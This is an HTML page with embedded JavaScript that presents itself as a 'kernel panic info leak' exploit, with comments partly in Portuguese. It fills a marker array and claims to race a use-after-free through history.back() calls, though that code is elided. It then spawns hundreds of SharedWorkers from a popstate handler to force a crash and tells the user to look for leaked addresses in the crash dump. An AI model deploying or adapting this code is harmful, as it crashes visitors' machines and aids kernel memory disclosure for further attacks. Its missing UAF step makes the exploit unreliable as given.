
<!DOCTYPE html>
<html>
<head><title>Panic-Assisted Leak</title></head>
<body>
<button onclick="leak()">Leak via Panic</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(m) { logEl.textContent += m + "\n"; }

async function leak() {
  log("=== KERNEL PANIC INFO LEAK ===\n");
  
  // 1. Criar objetos com padrões conhecidos
  const marker = new Uint32Array(1024);
  for(let i=0; i<1024; i++) {
    marker[i] = 0xDEAD0000 + i;
  }
  
  log("[1] Created marker array with pattern");
  
  // 2. Trigger UAF History
  log("[2] Triggering UAF...");
  // ... (código do UAF)
  
  // 3. Durante race, criar SharedWorkers até panic
  window.addEventListener('popstate', (e) => {
    if(e.state && e.state.index >= 40) {
      log("\n[3] RACE! Creating SharedWorkers...");
      
      const workers = [];
      let count = 0;
      
      const interval = setInterval(() => {
        for(let i=0; i<5; i++) {
          try {
            const w = new SharedWorker(
              "data:text/javascript,onconnect=e=>e.ports[0].start()",
              "leak_" + Date.now() + "_" + count
            );
            w.port.start();
            workers.push(w);
            count++;
            
            if(count >= 410) {
              clearInterval(interval);
              log(`\n[4] Reached 410 workers. Panic imminent...`);
              log("    Check crash dump for leaked addresses!");
              return;
            }
          } catch(e) {
            clearInterval(interval);
            log(`Error at ${count}: ${e.message}`);
            return;
          }
        }
        
        if(count % 50 === 0) log(`  Active: ${count}...`);
      }, 5);
    }
  });
  
  // Trigger race
  for(let i=0; i<15; i++) {
    history.back();
    await new Promise(r=>setTimeout(r,40));
  }
}
</script>
</body>
</html>
